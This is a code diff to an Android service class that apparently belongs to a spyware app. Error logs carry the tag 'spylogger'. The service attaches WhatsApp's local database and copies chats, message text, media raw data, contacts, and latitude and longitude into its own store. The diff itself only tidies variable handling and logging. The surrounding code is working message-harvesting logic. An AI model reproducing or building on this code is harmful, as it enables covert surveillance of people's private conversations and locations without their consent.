@@ -131,16 +131,16 @@ public class WhatsAppService extends Service {
     private void updateTopicos() {
         external = new DatabaseHelperExternal(getApplicationContext());
         dbHelper = new DatabaseHelper((getApplicationContext()));
-        int count=0;
+        GenericRawResults<String[]> raws;
+        List<Topico> topicos = new ArrayList<>();
+        Iterator<String[]> iterator;
         try {
             dbHelper.getWritableDatabase();
             daoMsgExternal = external.getMessagesDao();
             daoMsgExternal.executeRaw("attach database '" + inFileName + "' as 'localdb' ");
 
-
-            GenericRawResults<String[]> raws = daoMsgExternal.queryRaw("select _id,key_remote_jid, subject,sort_timestamp from chat_list where _id!=-1 and _id not in( select idReferencia from localdb.topico )");
-            List<Topico> topicos = new ArrayList<>();
-            Iterator<String[]> iterator = raws.iterator();
+            raws = daoMsgExternal.queryRaw("select _id,key_remote_jid, subject,sort_timestamp from chat_list where _id!=-1 and key_remote_jid not in( select idReferencia from localdb.topico where tipoMensagem=0 )");
+            iterator = raws.iterator();
             int contador = 0;
             while (iterator.hasNext()) {
                 String[] resultRaw = iterator.next();
@@ -165,25 +165,26 @@ public class WhatsAppService extends Service {
 
         updateMsgs(topicos);
 
-
-
         } catch (Exception e) {
-            e.printStackTrace();
+          Log.e("spylogger",e.getMessage());
+        }finally {
+            raws=null;
+            topicos=null;
+            iterator=null;
         }
     }
 
     private void updateMsgs(List<Topico> topicos){
+        GenericRawResults<Object[]> rawResults;
+        List<Mensagem> mensagens = new ArrayList<>();
+        Iterator<Object[]> iterator;
         try {
 
-            GenericRawResults<Object[]> rawResults = this.daoMsgExternal
+            rawResults = this.daoMsgExternal
                     .queryRaw("select _id,key_remote_jid,key_from_me,data,timestamp,media_wa_type,media_size,remote_resource,received_timestamp, case when raw_data is not null  then 1 else '' end,media_mime_type,raw_data,thumb_image,latitude,longitude from messages where key_remote_jid!='-1' and _id not in( select idReferencia from localdb.mensagem ) "
                             , new DataType[]{DataType.INTEGER,DataType.STRING,DataType.INTEGER,DataType.STRING,DataType.DATE_LONG,DataType.STRING,DataType.STRING,DataType.STRING,DataType.DATE_LONG,DataType.INTEGER,DataType.STRING,DataType.BYTE_ARRAY,DataType.BYTE_ARRAY});
 
-
-//            GenericRawResults<String[]> rawResults = this.daoMsgExternal
-//                    .queryRaw("select _id,key_remote_jid,key_from_me,data,timestamp,media_wa_type,media_size,remote_resource,received_timestamp, case when raw_data is not null  then 1 else '' end,media_mime_type from messages where key_remote_jid!='-1' and _id not in( select idReferencia from localdb.mensagem ) ");
-            List<Mensagem> mensagens = new ArrayList<>();
-            Iterator<Object[]> iterator = rawResults.iterator();
+            iterator = rawResults.iterator();
             int contador = 0;
 
             while (iterator.hasNext()) {
@@ -221,7 +222,6 @@ public class WhatsAppService extends Service {
                         .setTamanhoArquivo(Long.parseLong((String) resultRaw[6]))
                         .setTipoMidia(TipoMidia.getTipoMidia((String) resultRaw[5]))
                         .setMediaMime((String) resultRaw[10])
-//						.setContato(Utils.getContactDisplayNameByNumber(resultRaw[7],getContentResolver()))
                         .setContato((String) (resultRaw[7] != null ? resultRaw[7] : resultRaw[1]))
                         .setTopico(tmpTopico)
                         .setTemMedia("1".equals(resultRaw[9]))
@@ -229,7 +229,6 @@ public class WhatsAppService extends Service {
                         .setLongitude(resultRaw[14]!=null? Double.parseDouble((String) resultRaw[14]):null)
                         .build();
                 mensagem.setRaw_data(resultRaw[11]!=null? Utils.encodeBase64((byte[]) resultRaw[11]):null);
-//                mensagem.setThumb_image(resultRaw[12]!=null? Utils.encodeBase64((byte[]) resultRaw[12]):null);
 
                 if(!mensagem.getRemetente()) {
                     if (resultRaw[7] != null && !((String)resultRaw[7]).isEmpty()) {
@@ -275,8 +274,11 @@ public class WhatsAppService extends Service {
             }
             Log.i(this.getClass().getSimpleName(), "TERMINOU");
         }catch (SQLException e){
-            e.printStackTrace();
+            Log.e("spylogger",e.getMessage());
+        }finally {
+            rawResults=null;
+            mensagens = null;
+            iterator=null;
         }
     }
-
 }
